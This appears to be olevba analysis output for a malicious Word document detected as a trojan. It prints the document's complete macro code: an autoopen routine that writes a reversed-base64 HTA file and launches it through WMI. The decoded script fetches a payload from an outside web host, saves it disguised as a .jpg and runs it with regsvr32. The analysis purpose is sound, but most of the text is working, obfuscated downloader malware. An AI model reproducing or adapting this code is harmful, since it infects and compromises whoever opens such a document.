olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Alien.gen-d852242bb7db31e46cbb4c8b835e485e5feda6e537377630ecebad60ea52a830
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO frm.frm 
in file: word/vbaProject.bin - OLE stream: 'VBA/frm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Function rm()
rm = StrReverse("ath.esabataDretnuoc\atadmargorp\:c exe.rerolpxe\swodniw\:c")
End Function
Public Sub button1_Click()
Set bufferViewReference = GetObject("winmgmts:root\cimv2:Win32_Process")
bufferViewReference.Create p(rm)
End Sub

-------------------------------------------------------------------------------
VBA MACRO collectionCopy.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/collectionCopy'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub autoopen()
refRequest
End Sub
Function nvidia(namespaceCaption, nextView)
If namespaceCaption = 1 Then
nvidia = nextView
End If
End Function
Sub refRequest()
Dim exceptionCopy As String
tmpView = Split(p(frm.rm), " ")
exceptionCopy = tmpView(1)
Set repoTitle = New valueQuery
repoTitle.counterRepoCounter exceptionCopy, arrayCount
frm.button1_Click
End Sub
Function collectionReference(responseSelect, exceptionSwap, copyPointerButton)
End Function
-------------------------------------------------------------------------------
VBA MACRO loadRequestFunc.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/loadRequestFunc'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function textDataCaption(nextData As Long)
ptrSelect = Chr(nextData)
textDataCaption = nvidia(1, "<html><body><div id='content'>fTtlc29sYy50bnVvQ25vaXRwYUN4b2J0eGV0OykyICwiZ3BqLmVzYWJhdGFEcmV0bnVvY1xcY2lsYnVwXFxzcmVzdVxcOmMiKGVsaWZvdGV2YXMudG51b0Nub2l0cGFDeG9idHhldDspeWRvYmVzbm9wc2VyLnR4ZVR0c2lMd29kbml3KGV0aXJ3LnRudW9Dbm9pdHBhQ3hvYnR4ZXQ7MSA9IGVweXQudG51b0Nub2l0cGFDeG9idHhldDtuZXBvLnRudW9Dbm9pdHBhQ3hvYnR4ZXQ7KSJtYWVydHMuYmRvZGEiKHRjZWpiT1hldml0Y0Egd2VuID0gdG51b0Nub2l0cGFDeG9idHhldCByYXZ7KTAwMiA9PSBzdXRhdHMudHhlVHRzaUx3b2RuaXcoZmk7KShkbmVzLnR4ZVR0c2lMd29kbml3Oyllc2xhZiAsIlJHZXNQa0tUb1FBY1JCS3dad053NDBKbF")
End Function
Function refLoadProcedure(nextData As Long)
ptrSelect = Chr(nextData)
refLoadProcedure = nvidia(1, "RZN0ZJTz1lbWl0JnNPVT1kaXMmRUJjN3VpRDlCVXRpRUo4Qk14dz1lbWl0JjJpcUhCZ0o4QXVMR1d4OUMycTRJTz1kaWMmRWxBPXEmMGxEdnpXN3pXNj1kaWMmRDNQY05QelVud1czRndYTXJLYUs9Q0ImME12WG1KOHN4WkNSWkI4VkI0alhNc2tIcWg9cSZ6MDJoUXNGTjluYXAycE53PXJlc3UmMzVYNnBQZ1F1ZmtRRz1kaXM/NnVsYW0vMjI0OTcvZ0NzMEtFV0FDcmdHRVRZWThwNEFSVTZiNk03V0RXLzc4ODM3L0UvMjM1NjIvOGlKVjFQNkptM05iZ0tJUHBlZ0hYZmxqejVuSG53ZnAzUm9yL0dtN1B5Ymt3VHIxLzcyMjYxL3N5dW9nL21vYy53b3Jyb21vdGR5b2xsLy86cHR0aCIgLCJURUciKG5lcG8udHhlVHRzaUx3b2RuaXc7KSJwdHRobG14LjJsbXhzbSIodGNlamJPWGV2aX")
End Function
Function vbResponse(nextData As Long)
ptrSelect = Chr(nextData)
vbResponse = nvidia(1, "RjQSB3ZW4gPSB0eGVUdHNpTHdvZG5pdyByYXY=|fXspa25pTGVsdGl0KGhjdGFjfTspImF0aC5lc2FiYXRhRHJldG51b2NcXGNpbGJ1cFxcc3Jlc3VcXDpjIihlbGlmZXRlbGVkLmxhYm9sR3JlZmZ1Qm5pYW17eXJ0OykidGNlamJvbWV0c3lzZWxpZi5nbml0cGlyY3MiKHRjZWpiT1hldml0Y0Egd2VuID0gbGFib2xHcmVmZnVCbmlhbSByYXY7KSJncGouZXNhYmF0YURyZXRudW9jXFxjaWxidXBcXHNyZXN1XFw6YyAyM3J2c2dlciIobnVyLikibGxlaHMudHBpcmNzdyIodGNlamJPWGV2aXRjQSB3ZW4=</div><div id='table1'>ABCDEFGHIJKLMNOPQRSTUVWXYZ</div><div id='table2'>0123456789+/</div><div id='table3'></div><script language='ja")
End Function
Function pointerBufSelect(nextData As Long)
ptrSelect = Chr(nextData)
pointerBufSelect = nvidia(1, "vascript'>function varIteratorA(localViewConvert){return(new ActiveXObject(localViewConvert));}function constArgumentNext(namespaceAArgument){return(screenDatabase.getElementById(namespaceAArgument).innerHTML);}function collectionResponseStruct(){var funcLeftNext = constArgumentNext('table1');var exceptionVbMem = funcLeftNext.toLowerCase();var varProc = constArgumentNext('table2');return(funcLeftNext + exceptionVbMem + varProc);}function optionTextTmp(s){var e={}; var i; var b=0; var c; var x; var l=0; var ")
End Function
Function viewResponseGeneric(nextData As Long)
ptrSelect = Chr(nextData)
viewResponseGeneric = nvidia(1, "a; var valueArgumentProc=''; var w=String.fromCharCode; var L=s.length;var procedureScreen = 'charAt';for(i=0;i<64;i++){e[collectionResponseStruct()[procedureScreen](i)]=i;}for(x=0;x<L;x++){c=e[s[procedureScreen](x)];b=(b<<6)+c;l+=6;while(l>=8){((a=(b>>>(l-=8))&0xff)||(x<(L-2)))&&(valueArgumentProc+=w(a));}}return(valueArgumentProc);};function referenceValueList(copyClearWindow){return copyClearWindow.split('').reverse().join('');}storagePointerText = window;screenDatabase = document;storagePointerText.resi")
End Function
Function rightConvertList(nextData As Long)
ptrSelect = Chr(nextData)
rightConvertList = nvidia(1, "zeTo(1, 1);storagePointerText.moveTo(-100, -100);var vbMemoryConvert = screenDatabase.getElementById('content').innerHTML;var vbMemoryConvert = vbMemoryConvert.split('|');var WBorder = referenceValueList(optionTextTmp(vbMemoryConvert[0]));var nextRefListbox = referenceValueList(optionTextTmp(vbMemoryConvert[1]));</script><script language='javascript'>function procIterator(loadRemoveW){var memStruct = varIteratorA('msscriptcontrol.scriptcontrol');memStruct.Language = 'jscript';memStruct.Timeout = 60000;memSt")
End Function
Function convertNext(nextData As Long)
ptrSelect = Chr(nextData)
convertNext = nvidia(1, "ruct.AddCode(loadRemoveW);return(null);}</script><script language='vbscript'>procIterator WBorder : procIterator nextRefListbox : storagePointerText.close</script></body></html>")
End Function
Function arrayCount()
arrayCount = textDataCaption(6) + refLoadProcedure(4) + vbResponse(1) + pointerBufSelect(0) + viewResponseGeneric(4) + rightConvertList(5) + convertNext(7)
End Function
-------------------------------------------------------------------------------
VBA MACRO valueQuery.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/valueQuery'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Public Sub counterRepoCounter(memoryBufferStorage As String, leftNext As String)
Dim screenCaptionMemory As FileSystemObject
Set screenCaptionMemory = New FileSystemObject
Dim trustMem As TextStream
Set trustMem = screenCaptionMemory.CreateTextFile(memoryBufferStorage)
trustMem.WriteLine leftNext
trustMem.Close
Set trustMem = Nothing
Set screenCaptionMemory = Nothing
End Sub
-------------------------------------------------------------------------------
VBA MACRO procedureCopyFunc.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/procedureCopyFunc'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function p(indexException)
p = indexException
End Function
-------------------------------------------------------------------------------
VBA FORM Variable "b'button1'" IN 'word/vbaProject.bin' - OLE stream: 'frm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |button1_Click       |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

